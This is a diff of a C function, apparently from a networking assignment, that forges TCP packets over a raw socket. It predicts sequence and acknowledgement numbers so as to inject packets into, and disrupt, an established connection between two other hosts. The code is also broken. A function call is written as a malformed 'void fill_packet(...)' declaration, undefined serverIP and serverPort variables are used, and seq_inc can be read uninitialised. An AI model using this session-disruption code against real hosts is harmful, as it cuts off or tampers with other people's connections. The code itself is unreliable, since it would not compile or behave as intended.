@@ -101,18 +101,31 @@ void display_usage(char *name) {
  * @param sequenceNumber    The sequence number to be acknowledged by the desination.
  * @param ackNumber         The last sequence number acknowledged by the source.
  */
-void disrupt_session(char *sourceIP, uint16_t sourcePort, char *destinationIP, uint16_t destinationPort, uint32_t sequenceNumber, uint16_t ackNumber){
-
-/* TODO: Paul should throw off the connection established between the hosts represented by the given arguments:
-
+void disrupt_session(char *sourceIP, uint16_t sourcePort, char *destinationIP, uint16_t destinationPort, uint32_t sequenceNumber, uint32_t ackNumber) {
+    static bool checked = false;
+    static uint32_t prevSeq = 0;
+    static uint32_t prevAck = 0;
+    static char packet[65536];
+    
+    // Socket FD
     int sock, one = 1;
-    int packet_size = 44;
 
-    //Ethernet header + IP header + TCP header + data
-    char packet[packet_size];
+    // Amounts to increase ack and seq by
+    uint32_t ack_inc, seq_inc;
 
     //Address struct to sendto()
     struct sockaddr_in addr_in;
+
+    // Initialize static values if they have never been set
+    if(!checked) {
+        checked = true;
+        prevSeq = sequenceNumber;
+        prevAck = ackNumber;
+        ack_inc = 1;
+    } else {
+        ack_inc = ackNumber - prevAck;
+        seq_inc = sequenceNumber - prevSeq;
+    }
 
     //Raw socket without any protocol-header inside
     if((sock = socket(PF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
@@ -131,23 +144,18 @@ void disrupt_session(char *sourceIP, uint16_t sourcePort, char *destinationIP, u
     addr_in.sin_port = htons(atoi(serverPort));
     addr_in.sin_addr.s_addr = inet_addr(serverIP);
 
-    //Send lots of packets
-    int k = 5;
-    while(k--) { 
-        gen_packet( clientIP,
-                    serverIP,
-                    atoi(serverPort),
-                    atoi(clientPort),
-                    0, //syn
-                    1, //ack
-                    4012204404, //seq
-                    2948134111, //syn_ack
-                    'z', //data
-                    packet,
-                    packet_size);
-        send_packet(sock, packet, addr_in);
-        // TODO: Remove this break
-        break;
-    }
-*/
+    void fill_packet(sourceIP,
+                     destinationIP,
+                     destinationPort,
+                     sourcePort,
+                     0,
+                     1,
+                     sequenceNumber + seq_inc,
+                     ackNumber + ack_inc,
+                     '\0',
+                     packet,
+                     65536);
+
+    // Send out the packet
+    send_packet(sock, packet, addr_in);
 }
